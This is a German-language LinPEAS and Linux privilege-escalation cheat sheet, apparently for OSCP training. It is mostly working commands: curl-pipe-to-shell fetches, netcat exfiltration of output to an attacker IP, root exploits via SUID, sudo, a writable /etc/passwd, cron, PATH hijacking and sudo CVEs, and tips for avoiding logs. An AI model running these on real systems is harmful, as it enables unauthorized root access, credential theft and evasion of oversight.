# LinPEAS - Linux Privilege Escalation Awesome Script

## Was ist LinPEAS?

LinPEAS ist ein umfassendes automatisiertes Linux Privilege Escalation Enumeration Tool. Scannt nach hunderten von Privilege Escalation Vectors auf Linux/Unix-Systemen.

**Teil der PEASS-ng Suite:**
- LinPEAS - Linux/Unix
- WinPEAS - Windows
- MacPEAS - macOS

---

## Download & Installation

### GitHub Releases
```bash
# Latest Release
https://github.com/carlospolop/PEASS-ng/releases/latest

# Wichtigste Dateien:
# linpeas.sh          - Standard bash script
# linpeas_linux_amd64 - Statically compiled binary (x64)
# linpeas_linux_386   - Statically compiled binary (x86)
```

### Auf Kali vorbereiten
```bash
# Download
cd /opt
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Oder via git
git clone https://github.com/carlospolop/PEASS-ng
cd PEASS-ng/linPEAS

# Executable machen
chmod +x linpeas.sh
```

---

## File-Transfer zum Target

### Method 1: HTTP Download
```bash
# Kali: Python HTTP Server
python3 -m http.server 80

# Target: wget
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Oder curl
curl http://10.10.14.5/linpeas.sh | sh

# Direkt in memory ausführen (keine Disk-Spuren)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Method 2: SCP/SFTP
```bash
# Via SCP
scp linpeas.sh user@target:/tmp/

# Via SFTP
sftp user@target
put linpeas.sh /tmp/linpeas.sh
```

### Method 3: Base64 Transfer
```bash
# Kali: Encode
base64 -w0 linpeas.sh > linpeas.b64

# Target: Decode
echo "BASE64_STRING" | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

### Method 4: One-Liner (in-memory)
```bash
# Direkt ausführen ohne auf Disk zu schreiben
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Oder mit wget
wget -O - https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Method 5: Netcat Transfer
```bash
# Kali: Sender
nc -lvnp 4444 < linpeas.sh

# Target: Receiver
nc 10.10.14.5 4444 > linpeas.sh
chmod +x linpeas.sh
```

---

## Basis-Verwendung

### Standard Run
```bash
# Einfach ausführen
./linpeas.sh

# Mit bash explizit
bash linpeas.sh

# Output in Datei
./linpeas.sh > linpeas_output.txt

# Output + Fehler in Datei
./linpeas.sh 2>&1 | tee linpeas_out.txt
```

---

## Wichtige Parameter & Flags

### Scan-Tiefe

```bash
# Fast Mode (nur wichtigste Checks)
./linpeas.sh -a

# Super Fast (noch schneller)
./linpeas.sh -s

# Thorough Mode (sehr ausführlich, langsam)
./linpeas.sh -t
```

### Output-Optionen

```bash
# Keine Farben (besser für Files)
./linpeas.sh -o

# Quiet Mode (weniger Noise)
./linpeas.sh -q

# Output in spezifisches File
./linpeas.sh -P > /tmp/linpeas.txt

# Mit Farben in File (für later viewing)
./linpeas.sh > /tmp/linpeas_color.txt
# Dann: cat /tmp/linpeas_color.txt
```

### Netzwerk-Checks

```bash
# Network Checks deaktivieren (schneller, leiser)
./linpeas.sh -n

# Nur lokale Enum, keine network scans
./linpeas.sh -a -n
```

### Passwort-Suche

```bash
# Nach Passwords in Files suchen
./linpeas.sh -P

# Deep Password Search
./linpeas.sh -p my_password

# Keyword suchen
./linpeas.sh -s keyword_to_search
```

### Weitere Optionen

```bash
# Alle Flags:
-a    Fast mode (quick enumeration)
-s    Superfast mode (minimal checks)
-t    Thorough mode (extensive)
-q    Quiet mode (less output)
-o    No color output
-n    No network checks
-P    Password search
-p    Password to search for
-L    Follow symlinks (default: don't)

# Kombiniert
./linpeas.sh -a -q -o > output.txt   # Fast, quiet, no color
./linpeas.sh -t -P > full.txt        # Thorough + password search
```

---

## Output verstehen

### Farbcodes

```bash
RED/YELLOW  = 95% PE Vector (sehr wahrscheinlich)
RED         = 99% PE Vector (fast sicher!)
LightCyan   = Users with shell
Blue        = Users without shell
Green       = Wichtige Info
Yellow      = Potentiell interessant
```

### Sections (Reihenfolge)

1. **System Information** - OS, Kernel, Hostname
2. **Sudo Version** - Vulnerable sudo versions
3. **PATH** - Hijackable PATH
4. **Date/Locale** - System time
5. **Available Shells** - Welche Shells verfügbar
6. **Connected Users** - Wer ist eingeloggt
7. **Last Logged Users** - Letzte Logins
8. **Password Policy** - Passwort-Regeln
9. **Container/Cloud** - Docker, LXC, Cloud detection
10. **Interesting Files** - SUID, Capabilities, etc.
11. **Credentials** - Passwords in files/memory
12. **Processes** - Running processes
13. **Cronjobs** - Scheduled tasks
14. **Services** - Systemd/init services
15. **Software** - Installed applications
16. **Network** - Connections, interfaces, ports
17. **Users** - All system users
18. **Groups** - User groups

---

## Wichtigste Privilege Escalation Vectors

### 1. SUID Binaries
```bash
🔴 Interesting SUID files:
/usr/bin/find
/usr/bin/vim
/usr/bin/python

# Exploit (Beispiel: find)
./find . -exec /bin/bash -p \; -quit

# GTFOBins prüfen:
https://gtfobins.github.io
```

### 2. Sudo Rights (sudo -l)
```bash
🔴 User can run with sudo:
(ALL) NOPASSWD: /usr/bin/vim

# Exploit
sudo vim -c ':!/bin/bash'

# Oder
sudo vim
:set shell=/bin/bash
:shell
```

### 3. Writable /etc/passwd
```bash
🔴 /etc/passwd is writable!

# Exploit
# Generiere Password Hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$...

# Füge neuen root-user hinzu
echo 'hacker:$1$salt$...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
```

### 4. Cronjobs (Writeable Scripts)
```bash
🔴 Cronjob runs writable script:
*/5 * * * * /opt/backup.sh

# Exploit
echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/backup.sh

# Warten bis Cronjob läuft, dann:
/bin/bash -p
```

### 5. Kernel Exploits
```bash
🔴 Vulnerable Kernel Version:
Linux 3.13.0-24-generic

# Recherche
searchsploit linux kernel 3.13
# Oder
https://www.exploit-db.com

# Dirty COW, etc.
```

### 6. Capabilities
```bash
🔴 Interesting Capabilities:
/usr/bin/python3.8 = cap_setuid+ep

# Exploit
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 7. NFS no_root_squash
```bash
🔴 NFS share with no_root_squash:
/share *(rw,no_root_squash)

# Exploit (von Kali)
sudo mount -t nfs 192.168.1.10:/share /mnt
cd /mnt
sudo cp /bin/bash .
sudo chmod +s bash
# Auf Target
cd /share
./bash -p
```

### 8. Writable Service Files
```bash
🔴 Writable systemd service:
/etc/systemd/system/myservice.service

# Exploit
echo '[Service]' > /etc/systemd/system/pe.service
echo 'Type=oneshot' >> /etc/systemd/system/pe.service
echo 'ExecStart=/bin/bash -c "chmod +s /bin/bash"' >> /etc/systemd/system/pe.service
echo '[Install]' >> /etc/systemd/system/pe.service
echo 'WantedBy=multi-user.target' >> /etc/systemd/system/pe.service

systemctl daemon-reload
systemctl start pe.service
/bin/bash -p
```

### 9. Docker Socket
```bash
🔴 User in docker group:
uid=1000(user) gid=1000(user) groups=999(docker)

# Exploit
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Jetzt root in host filesystem
```

### 10. Passwords in Files
```bash
🔴 Password found in:
/var/www/html/config.php
/home/user/.bash_history
/opt/scripts/backup.sh

# Extrahieren & testen
cat /var/www/html/config.php | grep password
su root
# Passwort eingeben
```

### 11. PATH Hijacking
```bash
🔴 Script runs with sudo, uses relative path:
(ALL) NOPASSWD: /opt/script.sh
# script.sh: tar -czf backup.tar.gz /data

# Exploit
cd /tmp
echo '#!/bin/bash\nchmod +s /bin/bash' > tar
chmod +x tar
export PATH=/tmp:$PATH
sudo /opt/script.sh
/bin/bash -p
```

### 12. Sudo Version Exploits
```bash
🔴 Sudo version vulnerable:
Sudo version 1.8.27

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
./exploit
```

---

## Post-LinPEAS Exploitation Workflow

### 1. Output analysieren
```bash
# Auf Kali (nach Download)
cat linpeas_out.txt | grep "95%"
cat linpeas_out.txt | grep "99%"
cat linpeas_out.txt | grep -i "password"
cat linpeas_out.txt | grep -i "writable"
```

### 2. Priorisieren
```
1. Sudo -l / NOPASSWD → Oft einfachster Weg
2. SUID Binaries (GTFOBins) → Schnell
3. Writable /etc/passwd → Falls möglich, instant root
4. Cronjobs → Timing-abhängig
5. Kernel Exploit → Last resort (unstable)
```

### 3. Manual Verification
```bash
# Sudo prüfen
sudo -l

# SUID finden
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cronjobs
cat /etc/crontab
ls -la /etc/cron.*
```

---

## Kombination mit anderen Tools

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t  # Thorough
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### pspy (Process Monitoring)
```bash
# Zeigt laufende Prozesse (auch von anderen Usern)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

---

## OPSEC Considerations

### LinPEAS ist relativ laut
```
- Liest viele Files
- Enumerates Processes
- Checks Permissions
- Network Scans (optional)
```

### Leiser machen
```bash
# Fast mode + no network
./linpeas.sh -a -n -q

# In-memory (keine Disk-Spuren)
curl -L https://...linpeas.sh | sh
```

### Logs vermeiden
```bash
# Ausführen in /dev/shm (RAM, keine Logs)
cd /dev/shm
wget http://10.10.14.5/linpeas.sh
./linpeas.sh
rm linpeas.sh
```

---

## Praktische OSCP-Workflows

### Workflow 1: Standard Privesc Enum
```bash
# 1. Shell bekommen (z.B. via exploit)

# 2. LinPEAS hochladen
cd /dev/shm
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh

# 3. Ausführen + Output speichern
./linpeas.sh | tee linpeas.txt

# 4. Zur Kali exfiltrieren
# Via netcat
nc 10.10.14.5 4444 < linpeas.txt

# Oder via HTTP POST, etc.

# 5. Auf Kali analysieren
cat linpeas.txt | grep "99%"
```

### Workflow 2: In-Memory (stealth)
```bash
# Direkt aus Internet, keine Spuren
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /dev/shm/out.txt

# Output exfiltrieren
cat /dev/shm/out.txt | nc 10.10.14.5 4444
rm /dev/shm/out.txt
```

### Workflow 3: Fast Enum (Zeitdruck)
```bash
# Schneller Scan
./linpeas.sh -a -q

# Wichtigste Manual Checks parallel
sudo -l
find / -perm -4000 2>/dev/null
crontab -l
cat /etc/crontab
```

---

## Manual Checks (ohne LinPEAS)

Wenn LinPEAS nicht funktioniert:

### Essential Enum
```bash
# System Info
uname -a
cat /etc/issue
cat /etc/*-release

# Whoami
id
sudo -l

# Users
cat /etc/passwd
cat /etc/shadow 2>/dev/null

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable Directories
find / -writable -type d 2>/dev/null

# Cronjobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Processes
ps aux | grep root

# Network
netstat -antup
ss -tulpn

# Installed Software
dpkg -l  # Debian
rpm -qa  # RedHat
```

---

## Tipps & Tricks

### 1. Output zu groß
```bash
# Nur High-Value Findings
./linpeas.sh | grep -E "95%|99%"

# Oder quiet mode
./linpeas.sh -q
```

### 2. Keine Write-Permissions
```bash
# /dev/shm nutzen (RAM, fast immer writable)
cd /dev/shm
wget http://IP/linpeas.sh

# Oder /tmp
cd /tmp
```

### 3. Kein wget/curl
```bash
# Netcat Transfer
# Kali
nc -lvnp 4444 < linpeas.sh

# Target
nc 10.10.14.5 4444 > linpeas.sh
chmod +x linpeas.sh
```

### 4. Colored Output behalten
```bash
# Output mit Farben in File
./linpeas.sh > output.txt

# Später mit Farben ansehen
cat output.txt
# Oder
less -R output.txt
```

### 5. Password Search
```bash
# Nach Passwort-Pattern suchen
./linpeas.sh | grep -i passw
./linpeas.sh | grep -i "db_pass"
./linpeas.sh | grep -i "mysql"

# In Config-Files
grep -r "password" /var/www/html 2>/dev/null
grep -r "pass" /opt 2>/dev/null
```

---

## Quick Reference

### Commands
```bash
# Standard
./linpeas.sh

# Fast
./linpeas.sh -a

# Super Fast
./linpeas.sh -s

# Thorough
./linpeas.sh -t

# No Color
./linpeas.sh -o

# Output to File
./linpeas.sh | tee output.txt

# In-Memory
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### High-Value Findings
```bash
🔴 SUID Binaries (GTFOBins)
🔴 Sudo Rights (NOPASSWD)
🔴 Writable /etc/passwd or /etc/shadow
🔴 Writable Cronjob scripts
🔴 Vulnerable Kernel
🔴 Capabilities (cap_setuid)
🔴 NFS no_root_squash
🔴 Writable systemd services
🔴 Docker group membership
🔴 Passwords in files
🔴 PATH Hijacking
```

### Manual Essential Checks
```bash
sudo -l                                  # Sudo rights
find / -perm -4000 2>/dev/null           # SUID
getcap -r / 2>/dev/null                  # Capabilities
cat /etc/crontab                         # Cronjobs
id                                       # Groups (docker?)
uname -a                                 # Kernel version
```

---

## Wichtig für OSCP

1. **Immer ausführen** - LinPEAS ist essential für Linux PrivEsc
2. **Output speichern** - Für Report & spätere Analyse
3. **GTFOBins** - Bei SUID/Sudo immer GTFOBins checken
4. **Manual Verification** - Findings immer manuell verifizieren
5. **99% ≠ 100%** - Auch "99%" muss getestet werden
6. **Kombinieren** - Mit pspy, LinEnum für vollständige Coverage
7. **In-Memory** - Bei guter Verbindung bevorzugen
8. **/dev/shm** - Beste Location für Upload (RAM, keine Logs)

---

## Resources

- GitHub: https://github.com/carlospolop/PEASS-ng
- GTFOBins: https://gtfobins.github.io
- HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
